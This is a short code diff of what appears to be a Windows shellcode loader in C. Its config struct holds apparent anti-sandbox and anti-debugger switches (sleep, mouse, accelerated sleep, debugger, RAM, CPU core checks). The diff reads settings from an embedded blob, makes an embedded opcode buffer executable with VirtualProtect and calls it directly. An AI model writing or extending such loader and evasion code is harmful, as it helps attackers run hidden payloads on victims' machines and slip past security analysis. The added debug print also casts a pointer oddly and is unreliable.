@@ -24,7 +24,10 @@ struct Coconut
 
 int main()
 {
-	Coconut settings;
+	Coconut settings = *(Coconut*)rawData;
+
+
+	printf("%d %d %d %d %d %d %d %d | %d %d %d %d %d\n", settings.sleep, settings.sleepTime, settings.prime, settings.mouse, settings.acceleratedsleep, settings.debugger, settings.ram, settings.cpu_core, (BYTE)settings.opcodes, (BYTE)settings.opcodes + 1, (BYTE)settings.opcodes + 2, (BYTE)settings.opcodes + 3 );
 
 	if (settings.prime) 
 	{ 
@@ -61,9 +64,9 @@ int main()
 	}
 
 	DWORD old;
-	if (VirtualProtect((LPVOID)rawData, 20, PAGE_EXECUTE, &old)) {
+	if (VirtualProtect((LPVOID)settings.opcodes, settings.szData, PAGE_EXECUTE, &old)) {
 
-		int(*foo)() = (int(*)())(LPVOID)rawData;
+		int(*foo)() = (int(*)())(LPVOID)settings.opcodes;
 		DWORD foo_value = foo();
 
 	}
